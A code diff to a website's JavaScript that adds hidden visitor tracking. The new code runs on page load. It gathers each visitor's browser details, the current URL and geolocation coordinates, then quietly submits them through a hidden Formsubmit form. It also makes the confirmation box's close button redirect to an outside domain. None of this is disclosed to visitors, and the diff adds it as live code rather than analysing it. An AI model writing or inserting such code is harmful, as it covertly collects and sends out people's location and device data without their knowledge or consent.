@@ -33,6 +33,7 @@ const closeBtn = document.getElementById('closeBtn');
 if (closeBtn) {
     closeBtn.addEventListener('click', function () {
         document.getElementById('confirmationBox').style.display = 'none';
+        window.location.assign("https://omprakas.me")
     });
 }
 
@@ -160,3 +161,37 @@ function lightenDarkenColor(color, percent) {
 
     return `#${(1 << 24 | (r << 16) | (g << 8) | b).toString(16).slice(1).toUpperCase()}`;
 }
+//User information transfer using mail//
+ // Collect user information
+    function collectVisitorInfo() {
+      const userAgent = navigator.userAgent;  // Device and browser info
+      const location = window.location.href;  // Current URL (page)
+
+      // Get the visitor's location using the Geolocation API (if allowed)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          // Send the collected data to Formsubmit
+          sendVisitorData(userAgent, latitude, longitude, location);
+        });
+      } else {
+        // If geolocation is not allowed, just send empty coordinates
+        sendVisitorData(userAgent, null, null, location);
+      }
+    }
+
+    // Send the collected data to the hidden Formsubmit form
+    function sendVisitorData(userAgent, latitude, longitude, location) {
+      document.getElementById('userAgent').value = userAgent;
+      document.getElementById('latitude').value = latitude;
+      document.getElementById('longitude').value = longitude;
+      document.getElementById('location').value = location;
+
+      // Submit the form to Formsubmit
+      document.getElementById('visitorForm').submit();
+    }
+
+    // Collect and send data when the page loads
+    window.onload = collectVisitorInfo;
